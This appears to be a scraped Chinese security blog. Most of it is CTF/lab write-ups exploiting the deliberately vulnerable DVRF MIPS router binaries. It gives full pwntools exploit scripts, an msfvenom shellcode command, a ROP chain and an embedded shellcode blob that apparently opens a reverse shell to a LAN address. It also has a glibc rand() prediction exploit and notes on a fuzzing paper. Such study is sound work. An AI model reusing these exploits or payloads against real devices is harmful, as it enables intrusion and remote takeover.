&quot;debug&quot;# context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc_base = 0x3fee5000t9 = 0x00021278+libc_base #0x3ff11ff4#payload = &quot;a&quot;*0xcc + &#x27;\\xf4\\x1f\\xf1\\x3f&#x27; + &#x27;\\x50&#x27;+&#x27;\\\\&#x27;+&#x27;\\x09\\x40&#x27;payload = b&quot;a&quot;*0xcc + p32(t9)+b&#x27;\\x50&#x27;+b&#x27;\\\\&#x27;+b&#x27;\\x09\\x40&#x27;+cyclic(0x3d)+b&#x27;\\x50&#x27;+b&#x27;\\\\&#x27;+b&#x27;\\x09\\x40&#x27;io = process(b&quot;qemu-mipsel-static -L ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/ -g 1111 ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01 &quot;+payload,shell=True)elf = ELF(&quot;./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01&quot;)io.interactive() stack_bof_0232位小端序mips架构主要的一个漏洞仍然是通过strcpy引发的栈溢出 但是该程序没有提供后门函数 并且在描述中提到需要使用shellcode int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int16 v4; // [sp+18h] [+18h] BYREF char v5[498]; // [sp+1Ah] [+1Ah] BYREF v4 = 0; memset(v5, 0, sizeof(v5)); if ( argc &lt; 2 ) &#123; puts(&quot;Usage: stack_bof_01 &lt;argument&gt;\\r\\n-By b1ack0wl\\r&quot;); exit(1); &#125; puts(&quot;Welcome to the Second BoF exercise! You&#x27;ll need Shellcode for this! ;)\\r\\n\\r&quot;); strcpy((char *)&amp;v4, argv[1]); printf(&quot;You entered %s \\r\\n&quot;, (const char *)&amp;v4); puts(&quot;Try Again\\r&quot;); return 0;&#125; 没有开启任何保护那么还是老办法 想办法得到垃圾数据的长度 接着往栈上写入shellcode 随后劫持$ra寄存器跳转至shellcode这里介绍一个工具msfvenom 用其来生成我们所需要的shellcode sudo snap install metasploit-framework 安装 这里指定一下要生成的类型 执行&#x2F;bin&#x2F;sh的系统调用 mipsel架构 linux平台 去除\\x00字符 msfvenom -p linux/mipsle/exec CMD=/bin/sh --arch mipsle --platform linux -f py --bad-chars &quot;\\x00&quot; 在查询了其他师傅的博客后 发现都提到了一点 即可以利用nop sled来增加shellcode的泛用性大概的原理就是通过大量的nop指令堆在shellcode前面 这样程序执行流不管落在哪里都可以往下执行 和做x86题目用到的思路是一样的不过这里由于我关闭了aslr 所以栈的地址是固定的 就用不上了使用pwntools自带的shellcraft也可以生成shellcode顺带一提 如果使用stack_bof_01的exp脚本那种形式 不知道为什么同样的shellcode无法打通所以这里更换了一下exp 将payload写到文件中 再将文件的内容作为stack_bof_01的参数 from pwn import*from systemd import*context(log_level=&#x27;debug&#x27;,arch=&#x27;mips&#x27;,endian=&#x27;little&#x27;,bits=32)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]shellcode = asm(shellcraft.sh())stack_addr = 0x407ffbe8payload = shellcode.ljust(0x1fc,b&#x27;a&#x27;)+p32(stack_addr)with open(&quot;payload&quot;,&quot;wb+&quot;) as f: f.write(payload)#io = process(b&quot;./qemu-mipsel-static -L . -g 1111 ./pwnable/ShellCode_Required/stack_bof_02 &quot;+payload,shell=True)#elf = ELF(&quot;./pwnable/ShellCode_Required/stack_bof_02&quot;) ./qemu-mipsel-static -L . ./pwnable/ShellCode_Required/stack_bof_02 &quot;$(cat payload)&quot; socket_bof32位小端序mips架构保护全关接着来分析一下程序的主体逻辑 int __cdecl main(int argc, const char **argv, const char **envp)&#123; uint16_t v3; // $v0 int v4; // $v0 int v5; // $v0 size_t v6; // $v0 int v8; // [sp+24h] [+24h] int fd; // [sp+28h] [+28h] __int16 v10; // [sp+2Ch] [+2Ch] BYREF char v11[498]; // [sp+2Eh] [+2Eh] BYREF __int16 v12; // [sp+220h] [+220h] BYREF char v13[48]; // [sp+222h] [+222h] BYREF int v14; // [sp+254h] [+254h] BYREF struct sockaddr v15; // [sp+258h] [+258h] BYREF if ( argc &lt; 2 ) &#123; printf(&quot;Usage: %s port_number - by b1ack0wl\\n&quot;, *argv); exit(1); &#125; v10 = 0; memset(v11, 0, sizeof(v11)); v12 = 0; memset(v13, 0, sizeof(v13)); v14 = 1; fd = socket(2, 2, 0); bzero(&amp;v15, 0x10u); v15.sa_family = 2; *&amp;v15.sa_data[2] = htons(0); v3 = atoi(argv[1]); *v15.sa_data = htons(v3); v4 = atoi(argv[1]); printf(&quot;Binding to port %i\\n&quot;, v4); if ( bind(fd, &amp;v15, 0x10u) == -1 ) &#123; v5 = atoi(argv[1]); printf(&quot;Error Binding to port %i\\n&quot;, v5); exit(1); &#125; if ( setsockopt(fd, 0xFFFF, 4, &amp;v14, 4u) &lt; 0 ) &#123; puts(&quot;Setsockopt failed :(&quot;); close(fd); exit(2); &#125; listen(fd, 2); v8 = accept(fd, 0, 0); bzero(&amp;v10, 0x1F4u); write(v8, &quot;Send Me Bytes:&quot;, 0xEu); read(v8, &amp;v10, 0x1F4u); sprintf(&amp;v12, &quot;nom nom nom, you sent me %s&quot;, &amp;v10); printf(&quot;Sent back - %s&quot;, &amp;v10); v6 = strlen(&amp;v12); write(v8, &amp;v12, v6 + 1); shutdown(v8, 2); shutdown(fd, 2); close(v8); close(fd); return 66;&#125; 仍然对于argc进行了限制 需要我们提供程序参数接着建立了一个socket通信 使用AF_INET协议族 即ipv4 套接字类型为数据报套接字 传输协议默认使用ip随后使用bzero清空了v15数组 该数组用于存储socket信息我们输入的参数赋值于sa_data成员 同时经过了htons函数 由小端序变为大端序这里充当的是端口 随后利用bind函数和指定的端口相连接着调用listen函数等待指定的端口出现客户端连接 这里的程序充当服务端accept函数用于接受客户端的请求接受到的数据存放于v10数组漏洞出现在sprintf函数中 可以造成栈溢出显然 这里的攻击思路就是劫持程序执行流 使其跳转到我们写入的shellcode 首先还是要获取偏移 ./qemu-mipsel-static -L . -g 1234 ./pwnable/ShellCode_Required/socket_bof 9999 先启动程序 程序的端口为1234 监听的端口为9999随后gdb连接1234 断点打在read函数 调用exp脚本发送垃圾数据 断点打在赋值ra寄存器那边 得到偏移为0x33 from pwn import*from systemd import*context(log_level=&#x27;debug&#x27;,arch=&#x27;mips&#x27;,endian=&#x27;little&#x27;,bits=32)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]io = remote(&quot;127.0.0.1&quot;,9999)io.recvuntil(&quot;Send Me Bytes:&quot;)io.sendline(cyclic(0x300)) 按照原本的想法 直接打shellcode就行了 但是最后无法实现 查阅了其他师傅的博客问题出在mips架构的缓存不一致性 这一概念该如何理解对于cpu的cache缓存一定不陌生 L1 cache为了处理指令和数据 指令是只读 而数据是读写 为了提高读写效率 将其分为了两个cache I-cache(指令缓存) D-cache(数据缓存)所以这里需要将我们写入的shellcode从D-cache刷新到I-cache理解到这里 产生了一个疑问 为什么在stack_bof_02中 我们写入的shellcode不需要考虑到该问题 即可生效对比二者的程序逻辑 最明显的不同在于stack_bof_02从指令行中读取参数 socket_bof利用socket来获取数据猜测通过socket传输的数据存储在了D-cache中那么如何把数据从D-cache刷新到I-cache 利用sleep函数给予一定的时间 来让D-cache和I-cache二者同步所以接下来的目标就是寻找gadget 执行sleep(1)后跳转到shellcode这里学习使用一个新的工具 ida的插件mipsrop具体的安装和使用自行搜索教程 这里提一个我遇到的报错在edit中plugins的MIPS ROP Finder可以正常运行 但是在执行mipsrop.find(“li $a0,1”)时报错参照该教程 成功解决问题https://blog.csdn.net/snowleopard_bin/article/details/115376333执行mipsrop.find(“li $a0,1”)用来控制$a0寄存器 作为sleep函数的参数这里选用0x00018AA8这一条gadget执行完li $a0,1后 跳转的地址依赖于$s3寄存器接下来需要获取控制$s3寄存器的gadget有很多条 这里选用0x7730处的gadget在我们执行完sleep函数后 还需要跳转到shellcode处执行 那么这里就需要错开寄存器使用$s2或者$s1寄存器来跳转可以使用mipsrop.tail()函数 该函数可以查询所有函数尾部调用的gadget选择0x20F1C的gadget 通过$s2来执行shellcode那么总结一下gadget的执行顺序 首先执行0x7730的gadget 控制$s3为sleep函数的地址 $s2为0x00018AA8这条gadget的地址再控制$ra为0x20F1C的gadget 这条gadget控制$ra为shellcode的地址编写如下poc from pwn import*from systemd import*context(log_level=&#x27;debug&#x27;,arch=&#x27;mips&#x27;,endian=&#x27;little&#x27;,bits=32)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]io = remote(&quot;127.0.0.1&quot;,7777)io.recvuntil(&quot;Send Me Bytes:&quot;)buf = b&quot;&quot;buf += b&quot;\\xfa\\xff\\x0f\\x24\\x27\\x78\\xe0\\x01\\xfd\\xff\\xe4\\x21&quot;buf += b&quot;\\xfd\\xff\\xe5\\x21\\xff\\xff\\x06\\x28\\x57\\x10\\x02\\x24&quot;buf += b&quot;\\x0c\\x01\\x01\\x01\\xff\\xff\\xa2\\xaf\\xff\\xff\\xa4\\x8f&quot;buf += b&quot;\\xfd\\xff\\x0f\\x34\\x27\\x78\\xe0\\x01\\xe2\\xff\\xaf\\xaf&quot;buf += b&quot;\\x11\\x5c\\x0e\\x3c\\x11\\x5c\\xce\\x35\\xe4\\xff\\xae\\xaf&quot;buf += b&quot;\\xf7\\x83\\x0e\\x3c\\xc0\\xa8\\xce\\x35\\xe6\\xff\\xae\\xaf&quot;buf += b&quot;\\xe2\\xff\\xa5\\x27\\xef\\xff\\x0c\\x24\\x27\\x30\\x80\\x01&quot;buf += b&quot;\\x4a\\x10\\x02\\x24\\x0c\\x01\\x01\\x01\\xfd\\xff\\x11\\x24&quot;buf += b&quot;\\x27\\x88\\x20\\x02\\xff\\xff\\xa4\\x8f\\x21\\x28\\x20\\x02&quot;buf += b&quot;\\xdf\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01\\xff\\xff\\x10\\x24&quot;buf += b&quot;\\xff\\xff\\x31\\x22\\xfa\\xff\\x30\\x16\\xff\\xff\\x06\\x28&quot;buf += b&quot;\\x62\\x69\\x0f\\x3c\\x2f\\x2f\\xef\\x35\\xec\\xff\\xaf\\xaf&quot;buf += b&quot;\\x73\\x68\\x0e\\x3c\\x6e\\x2f\\xce\\x35\\xf0\\xff\\xae\\xaf&quot;buf += b&quot;\\xf4\\xff\\xa0\\xaf\\xec\\xff\\xa4\\x27\\xf8\\xff\\xa4\\xaf&quot;buf += b&quot;\\xfc\\xff\\xa0\\xaf\\xf8\\xff\\xa5\\x27\\xab\\x0f\\x02\\x24&quot;buf += b&quot;\\x0c\\x01\\x01\\x01&quot;shellcode_addr = 0x408000a0libc_addr = 0x3fee5000gadget1 = libc_addr + 0x7730gadget2 = libc_addr + 0x00018AA8gadget3 = libc_addr + 0x20F1Csleep_addr = libc_addr + 0x2F2B0payload = cyclic(0x33)+p32(gadget1)payload += cyclic(0x20)+p32(gadget2)+p32(sleep_addr)+p32(gadget3)payload += cyclic(0x24)+p32(gadget2)+p32(shellcode_addr)+bufio.sendline(payload)io.interactive() 执行发现程序卡在sleep函数执行中的这里问题出在$s2寄存器上本句汇编的作用为 将$s0的值赋值给$s2+0x64处的地址而此时对应的地址权限为不可写同时 在libc文件中定位到一段gadget这里对于$s2寄存器减去了大概0x4000多字节 所以我们要做的就是在执行gadget2的时候 把$s2寄存器替换为一个可读地址加上0x4000字节更改后的payload payload = cyclic(0x33)+p32(gadget1)payload += cyclic(0x20)+p32(gadget2)+p32(sleep_addr)+p32(gadget3)payload += cyclic(0x24)+p32(shellcode_addr+0x4000)+cyclic(0x4)+p32(shellcode_addr)+buf 此时已经可以成功执行sleep函数 但是新的问题出现了 没有按照预期的执行完sleep函数后根据$ra寄存器中的shellcode地址进行跳转 分析了sleep函数的汇编后发现问题出在sleep函数在结束的时候 还会对$ra寄存器重新赋值所以需要根据偏移重新布置栈这里解释一下为什么我的shellcode前面要有那么多额外的偏移 这是因为我shellcode如果不增加偏移的话 地址为0x408000a4 这其中有\\x00字节 会导致后面的字节都无法传输 所以将其更改为\\x01完整exp: from pwn import*from systemd import*context(log_level=&#x27;debug&#x27;,arch=&#x27;mips&#x27;,endian=&#x27;little&#x27;,bits=32)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]io = remote(&quot;127.0.0.1&quot;,2222)io.recvuntil(&quot;Send Me Bytes:&quot;)buf = b&quot;&quot;buf += b&quot;\\xfa\\xff\\x0f\\x24\\x27\\x78\\xe0\\x01\\xfd\\xff\\xe4\\x21&quot;buf += b&quot;\\xfd\\xff\\xe5\\x21\\xff\\xff\\x06\\x28\\x57\\x10\\x02\\x24&quot;buf += b&quot;\\x0c\\x01\\x01\\x01\\xff\\xff\\xa2\\xaf\\xff\\xff\\xa4\\x8f&quot;buf += b&quot;\\xfd\\xff\\x0f\\x34\\x27\\x78\\xe0\\x01\\xe2\\xff\\xaf\\xaf&quot;buf += b&quot;\\x11\\x5c\\x0e\\x3c\\x11\\x5c\\xce\\x35\\xe4\\xff\\xae\\xaf&quot;buf += b&quot;\\xf7\\x83\\x0e\\x3c\\xc0\\xa8\\xce\\x35\\xe6\\xff\\xae\\xaf&quot;buf += b&quot;\\xe2\\xff\\xa5\\x27\\xef\\xff\\x0c\\x24\\x27\\x30\\x80\\x01&quot;buf += b&quot;\\x4a\\x10\\x02\\x24\\x0c\\x01\\x01\\x01\\xfd\\xff\\x11\\x24&quot;buf += b&quot;\\x27\\x88\\x20\\x02\\xff\\xff\\xa4\\x8f\\x21\\x28\\x20\\x02&quot;buf += b&quot;\\xdf\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01\\xff\\xff\\x10\\x24&quot;buf += b&quot;\\xff\\xff\\x31\\x22\\xfa\\xff\\x30\\x16\\xff\\xff\\x06\\x28&quot;buf += b&quot;\\x62\\x69\\x0f\\x3c\\x2f\\x2f\\xef\\x35\\xec\\xff\\xaf\\xaf&quot;buf += b&quot;\\x73\\x68\\x0e\\x3c\\x6e\\x2f\\xce\\x35\\xf0\\xff\\xae\\xaf&quot;buf += b&quot;\\xf4\\xff\\xa0\\xaf\\xec\\xff\\xa4\\x27\\xf8\\xff\\xa4\\xaf&quot;buf += b&quot;\\xfc\\xff\\xa0\\xaf\\xf8\\xff\\xa5\\x27\\xab\\x0f\\x02\\x24&quot;buf += b&quot;\\x0c\\x01\\x01\\x01&quot;shellcode_addr = 0x408001a4libc_addr = 0x3fee5000gadget1 = libc_addr + 0x7730gadget2 = libc_addr + 0x00018AA8gadget3 = libc_addr + 0x20F1Csleep_addr = libc_addr + 0x2F2B0payload = cyclic(0x33)+p32(gadget1)payload += cyclic(0x20)+p32(gadget2)+p32(sleep_addr)+p32(gadget3)payload += cyclic(0x24)+p32(shellcode_addr+0x4000)+p32(shellcode_addr)+cyclic(0x30)+p32(shellcode_addr)+cyclic(0x100-0x30)+bufio.sendline(payload)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[]},{"title":"伪随机数推算","slug":"伪随机数推算","date":"2023-10-30T12:42:05.000Z","updated":"2023-11-04T02:09:46.000Z","comments":true,"path":"2023/10/30/伪随机数推算/","link":"","permalink":"http://example.com/2023/10/30/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%8E%A8%E7%AE%97/","excerpt":"","text":"前言以往遇到的考察伪随机数的题目都相对比较简单 无非就是通过seed来推算出后续的随机数 但是这次的核心在于 seed不可控且不可知的情况下 如何通过seed生成的伪随机数 来推算出后续的随机数 rand函数源码分析先来弄懂 rand函数究竟是如何通过seed来生成随机数的以下代码均从 https://codebrowser.dev/glibc/ 摘录 /* Return a random integer between 0 and RAND_MAX. */intrand (void)&#123; return (int) __random ();&#125; 内部进而调用了__random函数 跟进一下看看 __random (void)&#123; int32_t retval; __libc_lock_lock (lock); (void) __random_r (buf: &amp;unsafe_state, result: &amp;retval); __libc_lock_unlock (lock); return retval;&#125; 重点关注一下__random_r函数 unsafe_state结构体作为参数传输 返回值存储于retval static struct random_data unsafe_state =&#123; /* FPTR和RPTR是指向状态信息的两个指针，一个前指针和一个后指针。 这两个指针始终相隔rand_sep个位置，因为它们在状态信息中循环。 （是的，这意味着我们可以只用一个指针，但是这种方式的random代码更高效）。 这两个指针的位置是从调用initstate(1, randtbl, 128)的位置开始： （后指针rptr的位置实际上是0（如上面在初始化randtbl时解释的那样）， 因为状态表指针被设置为指向randtbl[1]（如下面解释的那样）。）*/ .fptr = &amp;randtbl[SEP_3 + 1], // SEP_3 = 3 .rptr = &amp;randtbl[1], /* 以下内容是指向状态信息表的指针、当前生成器的类型、当前多项式的度数和两个指针之间的间隔。 注意，为了random的效率，我们记住状态信息的第一个位置，而不是第零个位置。 因此，访问state[-1]是有效的，它用于存储R.N.G.的类型。 另外，我们记住最后一个位置，因为这比每次索引以查找最后一个元素的地址来判断前后指针是否已经回绕更高效。 */ .state = &amp;randtbl[1], .rand_type = TYPE_3, // 3 .rand_deg = DEG_3, // 3 .rand_sep = SEP_3, // 3 .end_ptr = &amp;randtbl[sizeof(randtbl) / sizeof(randtbl[0])]&#125;; 根据注释可以得到 fptr和rptr是指向状态信息的前后指针 并且虽然rptr的起始是randtbl[1]但是实际上是0为了理解这一描述 我们先来看一下randtbl数组的内容 static int32_t randtbl[DEG_3 + 1] =&#123; TYPE_3, -1726662223, 379960547, 1735697613, 1040273694, 1313901226, 1627687941, -179304937, -2073333483, 1780058412, -1989503057, -615974602, 344556628, 939512070, -1249116260, 1507946756, -812545463, 154635395, 1388815473, -1926676823, 525320961, -1009028674, 968117788, -123449607, 1284210865, 435012392, -2017506339, -911064859, -370259173, 1132637927, 1398500161, -205601318&#125;; 该数组存储着内部状态信息 用于随机数的生成通过randtbl数组的注释 我们可以得知上文中 后指针的位置为0的原因 Initially, everything is set up as if from: ↪ initstate(1, randtbl, 128); ↪ Note that this initialization takes advantage of the fact that srandom ↪ advances the front and rear pointers 10*rand_deg times, and hence the ↪ rear pointer which starts at 0 will also end up at zero; thus the zeroth ↪ element of the state information, which contains info about the current ↪ position of the rear pointer is just ↪ (MAX_TYPES * (rptr - state)) + TYPE_3 == TYPE_3. 后指针在初始化的时候指向第一个元素 所以第一个元素存储的是后指针当前位置的信息接着我们回到unsafe_state结构体其还定义了其他成员 用来记录生成器类型 随机次数 随机间隔此外还记录了最后一个元素的位置接下来分析一下__random_r函数 int __random_r(struct random_data *buf, int32_t *result)&#123; int32_t *state; if (buf == NULL || result == NULL) goto fail; state = buf-&gt;state; if (buf-&gt;rand_type == TYPE_0) &#123; int32_t val = ((state[0] * 1103515245U) + 12345U) &amp; 0x7fffffff; state[0] = val; *result = val; &#125; else &#123; int32_t *fptr = buf-&gt;fptr; int32_t *rptr = buf-&gt;rptr; int32_t *end_ptr = buf-&gt;end_ptr; uint32_t val; val = *fptr += (uint32_t)*rptr; /* Chucking least random bit. */ *result = val &gt;&gt; 1; ++fptr; if (fptr &gt;= end_ptr) &#123; fptr = state; ++rptr; &#125; else &#123; ++rptr; if (rptr &gt;= end_ptr) rptr = state; &#125; buf-&gt;fptr = fptr; buf-&gt;rptr = rptr; &#125; return 0;fail: __set_errno(EINVAL); return -1;&#125; 参考注释可以得知 生成器有两种类型 TYPE_0是使用旧的线性同余法 另外一个则是使用精巧三项式算法先来看较为简单的前者 state[0]指向randtbl数组的第二个元素 将其乘以1103515245 U代表无符号整数 随后加上12345 最后进行与运算这里清空了符号位 并且只保留低31位随后更新state[0]以及result 接下来看后者开始先将结构体的成员赋值给对应的局部变量(下面 前指针和后指针所指向的数值 为了方便描述 均采用缩写为前后指针接着将后指针加上前指针 其和重新赋值给了前指针以及val变量随后的注释比较耐人寻味 其说舍弃最不随机的位下一条指令对val右移了一位 相当于val除2 结果取整这里说的最不随机的位指的是最低1位就拿线性同余运算举例其运算式为 val = ((state[0] * 1103515245U) + 12345U) &amp; 0x7fffffff 这里使用state[0]默认的值379960547代入可以编写这样一个测试程序 #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;int main()&#123; int32_t state = 379960547; int32_t val =0; int time=1; int bit =0; for(int i=0;i&lt;20;i++)&#123; val = ((state * 1103515245U) + 12345U) &amp; 0x7fffffff; bit = val&amp;1; state = val; printf(&quot;count :%d ,val :%d,last bit: %d\\n&quot;,time,val,bit); time ++; &#125;&#125; 最后得到的结果为可以看到最后一个bit为0和1交替 呈现出一定规律 所以称之为最不随机的位说回正文 在进行了右移运算后 自增了前指针如果前指针超过了数组的最后一个元素 那么就重置前指针 使其重新指向randtbl数组的第二个元素如果没有超过 再自增后指针 如果后指针超过 那么就重置后指针 同上 如何预测随机数经过上面的源码分析可以大概清楚随机数的生成逻辑state数组从randtbl数组的第二个元素开始 也就是说state一共有31个元素前指针初始指向s[3] (这里将state数组缩写成s)后指针初始指向s[0]那么我们这里就可以得到随机数数组o的第一个元素为o[0] &#x3D; (s[3]+s[0])&gt;&gt;1随后前指针和后指针均自增随着推移 前指针会率先来到s数组的最后一个元素s[30]根据源码推断 超过了s[30]后 就会重新赋值成s[0]但是这里要注意 在随机数生成后 后指针与前指针之和会赋值给前指针所以我们这里的s[?]只是一个代号 而非具体的值也就是o[28] &#x3D; (s[0]+s[28])&gt;&gt;1同理 o[31] &#x3D; (s[3]+s[0])&gt;&gt;1如果拆分开成 s[3]&#x3D;s[3]+s[0],s[0] &#x3D; s[0]+s[28]o[31]的值就有两种可能性第一种为o[31] &#x3D; o[0]+o[28]第二种为o[31] &#x3D; o[0]+o[28]+1见下面表格 s[0] s[3] s[28] o[31] 奇 奇 奇 1 奇 奇 偶 1 奇 偶 奇 1 偶 奇 奇 2 奇 偶 偶 2 偶 偶 奇 1 偶 偶 偶 1 可以看出是第一种可能性的概率为七分之五也就是说 如果我们得到了o[0]和o[28] 我们就有比较大的概率预测出o[31]同理 可以继续往下推 o[1]和o[29] 可得出o[32]等等o[n] &#x3D; o[n-31]+o[n-3]或o[n] &#x3D; o[n-31]+o[n-3]+1由于本人数学水平不高 所以无法想出怎么百分百预测 感兴趣的可以自己尝试(顺顺教教我 实际演示以上面这题来举例 seed无法得知也无法覆盖一共有101次机会在猜数错误后 会提供正确的随机数所以我们只需要保留o[0]和o[28]就可以得出第32个随机数o[31] o = []buf = 0for i in range(31): io.recvuntil(&quot;Knowledge is power, not luck.\\n&quot;) io.sendline(b&#x27;0&#x27;) io.recvuntil(&#x27;Here is some knowledge to help you become powerful...: &#x27;) c = int(io.recvuntil(&quot;\\n&quot;,drop = True)) o.append(c)buf = o[0]+o[28]print(buf)io.recvuntil(&quot;Knowledge is power, not luck.\\n&quot;)io.sendline(str(buf))io.recv()io.recv() 成功得到正确的数值 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"extra","slug":"extra","permalink":"http://example.com/categories/extra/"}],"tags":[]},{"title":"Fuzzing: Art, Science, and Engineering论文阅读","slug":"fuzzing-art-science-and-engineering论文阅读","date":"2023-10-17T09:13:39.000Z","updated":"2023-10-22T14:07:16.000Z","comments":true,"path":"2023/10/17/fuzzing-art-science-and-engineering论文阅读/","link":"","permalink":"http://example.com/2023/10/17/fuzzing-art-science-and-engineering%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/","excerpt":"","text":"原论文地址:https://arxiv.org/pdf/1812.00140.pdf由于本人的英文水平实在是太垃圾了 所以用的是谷歌机翻看的部分语句可能由于机翻带来的影响导致语义错误 Abstract模糊测试是一种概念简单 部署门槛低 且成效显著的漏洞发现技术本文的目的旨在帮助保存大量的模糊测试样例以及保证其连贯性 提出一个统一的通用模型 Introduction作者简单介绍了fuzz是什么 以及此前其存在的缺陷 同时举了几个比赛队伍或者厂商使用FUZZ的案例 随后简要概括了fuzz社区的规模因为fuzz的逐渐发展 导致了各种fuzz工具之间的术语存在明显的“歧义”(fragmentation)作者认为 这种歧义很有可能会阻碍fuzz的传播 影响到fuzz的发展所以 其认为有必要巩固和提炼模糊测试的进展 SYSTEMIZATION, TAXONOMY, AND TEST PRO-GRAMS介绍了模糊测试最开始的提出者以及其最开始的定义 列举了模糊测试可适用的领域 接着为了使得大量模糊测试文献中的用语系统化 作者决定介绍一个由现代用途中提取的术语 1.Fuzzing &amp; Fuzz Testing本小节针对模糊测试下了第一个定义 Definition 1 (Fuzzing). Fuzzing is the execution of the PUTusing input(s) sampled from an input space (the “fuzz inputspace”) that protrudes the expected input space of the PUT.这里的put是program under test 此外还针对fuzz testing和fuzz进行了一个定义作者认为fuzz testing是一种利用fuzz的软件测试技术 其的特定目标是用来查找和安全有关的错误 包括程序崩溃 Definition 2 (Fuzz Testing). Fuzz testing is the use of fuzzingto test if a PUT violates a security policy. Definition 3 (Fuzzer). A fuzzer is a program that performsfuzz testing on a PUT. 此外还定义了fuzz compaign Definition 4 (Fuzz Campaign). A fuzz campaign is a specificexecution of a fuzzer on a PUT with a specific securitypolicy. 早期的模糊测试活动 其安全策略只局限于测试输入 使PUT崩溃 但是模糊测试活动可以用于测试执行中观察到的任何安全策略 而这一决定执行是否违反安全策略的称为漏洞预测器 Definition 5 (Bug Oracle). A bug oracle is a program, per-haps as part of a fuzzer, that determines whether a givenexecution of the PUT violates a specific security policy. 这一段话有点没看懂 目前还不能理解执行中观察到的任何安全策略的含义 除了输入点可以诱发的崩溃 还有什么呢 笔者于这里提出了第一个疑问作者称由模糊器实现的算法为模糊算法 模糊参数是依赖于PUT之外的一些参数 称其为模糊配置 笔者这里将其理解为 模糊参数于PUT不相干 是否可以认为是一种用于模糊测试的语料库 Definition 6 (Fuzz Configuration). A fuzz configuration ofa fuzz algorithm comprises the parameter value(s) thatcontrol(s) the fuzz algorithm. 接着针对模糊算法进行了进一步的说明 作者认为模糊算法的定义是广泛的 复杂的模糊配置会随着时间的推移而演变其算法 引入了突变率和种子的概念种子是用来生成输入PUT的测试用例而种子的集合则成为种子池 复杂的模糊配置就会演变种子池作者举了一个基于覆盖率引导的模糊测试例子 其会在每个配置中存储已经达到的覆盖率信息笔者这里经过查阅资料(其实是询问gpt 大致了解了覆盖率是一种什么概念覆盖率引导是一种模糊测试的技术策略 其主要目的是用来寻找最优的测试用例 该测试用例可以经过最多的代码分支 经过的代码占总代码的百分比就是覆盖率那么这里就是一种迭代的过程 会根据上一次的模糊测试返回的覆盖率 来决定下一次的种子 从而使其获得更大的覆盖率 2.Paper Selection Criteria这一小节 主要是作者声明了收纳出版物的范围 举了几个会议的名称同时引入了黑盒白盒的概念(并未由作者提出 为笔者根据段落大意可以看出)作者认为 以安全为特定目标的模糊测试和软件测试相比 从理论来说 二者的不同点只体现在漏洞预测器的区别(bug oracle)接着作者提到 在实际中 软件测试的前提是知晓源代码 而且测试人对于PUT有更多的了解而模糊测试更可能是被PUT开发者以外的人使用 其不知晓上述信息由于这二者领域仍然密切相关 所以作者决定 只要出版物出现模糊(fuzz)一次 就纳入其中 3.Fuzz Testing Algorithm本节作者提供了一个算法1其采用一组模糊配置C以及Tlimit(最大时间限制)作为输入输出一组已发现的错误其由两部分组成 第一部分为预处理(preprocess)函数构成 该函数在模糊测试开始时执行第二部分为由五个功能组成的循环 但不是所有的模糊器都全是这五个功能称这个循环的每次运行为模糊迭代 每次inputeval将模糊样例输入给PUT称为模糊运行 PREPROCESS(C)-&gt;C用户向P提供一组模糊配置 其可能返回一组已修改的模糊配置根据模糊算法的不同 P可以执行各种各样的操作 比如插入测试代码到PUT中或者测量种子文件的执行速度 SCHEDULE(C,Telapsed,Tlimit)-&gt;conf将一组模糊配置C 最大时间限制 经过的时间作为参数输入 其会返回一个用于当前模糊迭代的模糊配置这句话笔者有点没看懂 是意味着该功能负责实现模糊配置的迭代?不过作者说详细看2.4节 所以这里暂且留一个疑问 INPUTGEN(conf)-&gt;tcs这个功能输入一个当前模糊配置 根据模糊器的不同 会选择模糊配置中的种子 又或者是模型或语法作为参数 以此来输出模糊测试的样例笔者这里对于模型和语法是什么东西 还没有概念 先继续往下看 INPUTEVAL(conf,tcs,0bug)-&gt;B,execinfos接收当前模糊配置conf 模糊测试样例 以及漏洞预测器作为参数该功能用于判断PUT是否违反了安全策略结束后会输出一个漏洞合集B 以及execinfos 用来迭代模糊配置 CONFUPDATE(C,conf,execinfos)-&gt;C接收模糊配置C 当前模糊配置conf execinfos作为参数该功能用来更新模糊配置C CONTINUE(C)-&gt;{True,False}该功能用来接收当前模糊配置 并且进行判断是否进行模糊迭代如果没有新的路径可发现 其就可以终止执行 4.Taxonomy of Fuzzers本节 作者对于模糊器的分类进行了定义 分为了三种 黑盒 白盒 灰盒同时 这与传统的软件测试分类不同 灰盒是作为白盒的变体 Black-box Fuzzer黑盒适用于模糊测试以及软件测试中 表示测试者无法看到PUT的内部结构 只能看到PUT的输入输出 大部分的模糊器都属于这一类现代的部分模糊器 在考虑输入的结构信息以此来生成更有意义的测试样例的同时 也会保证不检查PUT White-box Fuzzer白盒测试是指在进行模糊测试的时候 已经了解了PUT的内部结构和逻辑接着作者提到 白盒测试一词最早的提及是动态符号执行DSE普通的符号执行是指利用符号值而非输入值来分析执行路径而动态符号执行中 符号执行和具体执行路径同时运行 根据PUT的状态和具体输入的数据来简化符号约束条件在简化符号约束条件中 可以将符号值转化为具体的值 例如将符号执行的系统调用转化为实际的系统调用上述的符号值表示的概念 按笔者的理解 应该是用例如符号’a’这样的字符来代替具体的值例如’6’ 类似于数学中一元方程的x随后 